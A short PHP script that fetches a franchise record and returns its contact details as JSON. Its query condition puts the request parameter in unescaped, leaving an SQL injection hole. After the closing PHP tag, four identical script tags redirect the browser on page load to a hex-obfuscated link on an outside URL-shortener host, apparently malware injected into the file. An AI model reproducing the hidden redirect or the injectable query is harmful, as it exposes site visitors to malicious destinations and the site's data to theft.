<?php
require_once("helper.php");
$vle=$objMisc->getRow('franchise_master',"FRANCHISE_ID='$_REQUEST[franchise_id]'");
$franData=array('FRANCHISE_ID'        =>$vle['franchise_id'],
                'NAME'                =>$vle['name'],
                'PHONE_NO'            =>$vle['phone_no'],
                'MOBILE_NO'           =>$vle['mobile_no'],
                'GSTIN'               =>$vle['gstin'],
                'ADDRESS'             =>$vle['address'],
              );
	if(!empty($franData)){
		$json= array(
                'type'=>"1",
                'data'=>$franData,
                'msg'=>'success');
        echo json_encode($json);
        exit;
    }else{
        $json= array(
            'type'=>"0",
            'err_desc'=>'no records found',
            'msg'=>'no records found'
          );
        echo json_encode($json);
        exit;
    }

?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>